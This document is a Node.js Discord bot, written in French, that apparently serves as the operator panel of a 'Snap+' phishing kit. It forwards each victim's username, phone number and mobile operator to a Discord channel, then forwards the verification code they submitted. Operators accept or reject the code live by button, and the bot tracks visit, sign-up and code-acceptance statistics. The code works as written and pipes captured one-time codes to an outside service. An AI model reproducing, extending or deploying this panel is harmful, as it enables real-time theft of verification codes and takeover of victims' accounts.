const {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require('discord.js');
const { users, stats } = require('./store');

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const SEPARATOR = '──────────────────────────────────────────────────────';

let statsMessageId = null;
let statsChannelId = null;

// ======================= UTILITAIRES =======================
function formatPhoneNumber(phone) {
  if (!phone) return 'N/A';
  return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
}

function formatUptime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);

  if (days > 0) return `${days}j ${hours % 24}h ${minutes % 60}m`;
  if (hours > 0) return `${hours}h ${minutes % 60}m`;
  if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
  return `${seconds}s`;
}

function getPercentage(value, total) {
  if (total === 0) return 0;
  return ((value / total) * 100).toFixed(1);
}

// ======================= "RICH BLOCKS" => content text =======================
// On simule le rendu de ton JSON par du texte structuré en content.
function richTextFromBlocks(blocks) {
  // blocks = [ { type: 10, content }, { type: 14, divider: true }, ... ]
  let out = [];
  for (const b of blocks) {
    if (b.type === 10 && typeof b.content === 'string') out.push(b.content);
    if (b.type === 14 && b.divider) out.push(SEPARATOR);
    // spacing ignored (le rendu se fait avec sauts de ligne)
  }
  return out.join('\n');
}

function sendLikeNewInscription(username, phone, operator) {
  return [
    { type: 10, content: "# 📱 Nouvelle inscription Snap+" },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
    { type: 10, content: `### 🏛️ Opérateur: ${operator || 'N/A'}` },
    { type: 10, content: `### ⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: "En attente du code..." },
  ];
}

function sendLikeCodeSubmitted(username, phone, code) {
  return [
    { type: 10, content: "# 🔒 Code de vérification soumis" },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
    { type: 10, content: `### 🔢 Code saisi: \`${code}\`` },
    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
    { type: 10, content: `### 📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: "En attente de validation par un modérateur" },
  ];
}

function sendLikeAccept(username, phone, code, validatedBy) {
  return [
    { type: 10, content: "# ✅ Code validé" },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
    { type: 10, content: `### 🔢 Code: \`${code}\`` },
    { type: 10, content: `### 📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
    { type: 10, content: `### ✅ Validé par: ${validatedBy}` },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: "*Utilisateur vérifié*" },
  ];
}

function sendLikeReject(username, phone, code, rejectedBy) {
  return [
    { type: 10, content: "# 🔒 Code rejeté" },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: `### 👤 Nom d'utilisateur: ${username}` },
    { type: 10, content: `### 🔢 Code saisi: \`${code || 'N/A'}\`` },
    { type: 10, content: `### 📞 Téléphone: ${formatPhoneNumber(phone)}` },
    { type: 10, content: `### 📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}` },
    { type: 10, content: `### ❌ Rejeté par: ${rejectedBy}` },
    { type: 14, divider: true, spacing: 2 },
    { type: 10, content: "*L'utilisateur devra ressaisir le code*" },
  ];
}

// ======================= "STATS" en content =======================
function createStatsText() {
  const uptime = formatUptime(Date.now() - stats.startTime);
  const STATS_SEPARATOR = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

  return [
    `${STATS_SEPARATOR}\n`,
    `### 👥 **Visiteurs**`,
    `🌐 **Total des visites:** \`${stats.totalVisits}\``,
    `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\``,
    `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}`,
    ``,
    `### 📝 **Inscriptions**`,
    `📱 **Total inscriptions:** \`${stats.totalRegistrations}\``,
    `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}`,
    ``,
    `### 🔐 **Codes de vérification**`,
    `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\``,
    `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)`,
    `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)`,
    ``,
    `### ⏱️ **Système**`,
    `🟢 **Uptime:** ${uptime}`,
    `���� **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
    ``,
    `${STATS_SEPARATOR}`,
    ``,
    `*🔄 Actualisation automatique toutes les 30 secondes*`,
  ].join('\n');
}

async function initStatsEmbed() {
  statsChannelId = process.env.STATS_CHANNEL_ID;
  if (!statsChannelId) {
    console.warn('⚠️ STATS_CHANNEL_ID non défini dans .env - Stats désactivées');
    return;
  }

  try {
    const channel = await client.channels.fetch(statsChannelId);

    const messages = await channel.messages.fetch({ limit: 10 });
    const existingStats = messages.find(
      (msg) => msg.author.id === client.user.id && (msg.content || '').includes('Statistiques en temps réel - Snap+')
    );

    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;

    if (existingStats) {
      await existingStats.edit({ content: text });
      statsMessageId = existingStats.id;
      console.log('✅ Stats mises à jour');
    } else {
      const msg = await channel.send({ content: text });
      statsMessageId = msg.id;
      console.log('✅ Stats créées');
    }

    setInterval(() => updateStatsMessage().catch(() => {}), 30000);
  } catch (err) {
    console.error('❌ Erreur initialisation stats:', err);
  }
}

async function updateStatsMessage() {
  if (!statsMessageId || !statsChannelId) return;

  try {
    const channel = await client.channels.fetch(statsChannelId);
    const message = await channel.messages.fetch(statsMessageId);

    const text = `📊 Statistiques en temps réel - Snap+\n\n${createStatsText()}`;
    await message.edit({ content: text });
  } catch (err) {
    console.error('❌ Erreur mise à jour stats:', err);
  }
}

// Fonction appelée par server.js pour mettre à jour les stats
function updateStatsEmbed() {
  if (statsMessageId && statsChannelId) {
    updateStatsMessage().catch(() => {});
  }
}

// ======================= BOT DISCORD =======================
client.once('ready', () => {
  console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
  setTimeout(() => initStatsEmbed(), 2000);
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const [action, username] = interaction.customId.split(':');
  const user = users[username];

  if (!user) {
    return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
  }

  if (action === 'accept') {
    user.status = 'verified';

    const embedText = richTextFromBlocks(
      sendLikeAccept(username, user.phone, user.submittedCode, interaction.user.tag)
    );

    stats.codesAccepted++;

    await interaction.update({
      content: embedText,
      components: [],
    });

    updateStatsEmbed();
  }

  if (action === 'reject') {
    user.status = 'rejected';
    const rejectedCode = user.submittedCode;
    user.submittedCode = null;

    const embedText = richTextFromBlocks(
      sendLikeReject(username, user.phone, rejectedCode, interaction.user.tag)
    );

    stats.codesRejected++;

    await interaction.update({
      content: embedText,
      components: [],
    });

    updateStatsEmbed();
  }
});

// ======================= EXPORTS (appelés par server.js) =======================
async function sendInitialEmbed(username, phone) {
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
  const user = users[username];

  const blocks = sendLikeNewInscription(username, phone, user?.operator);
  const text = richTextFromBlocks(blocks);

  await channel.send({ content: '@everyone\n\n' + text });
}

async function sendCodeEmbed(username) {
  const user = users[username];
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

  const blocks = sendLikeCodeSubmitted(username, user.phone, user.submittedCode);
  const text = richTextFromBlocks(blocks);

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`accept:${username}`)
      .setLabel('Accepter')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId(`reject:${username}`)
      .setLabel('Refuser')
      .setStyle(ButtonStyle.Danger)
  );

  await channel.send({ content: '@everyone\n\n' + text, components: [row] });
}

client.login(process.env.BOT_TOKEN);

module.exports = { sendInitialEmbed, sendCodeEmbed, updateStatsEmbed };
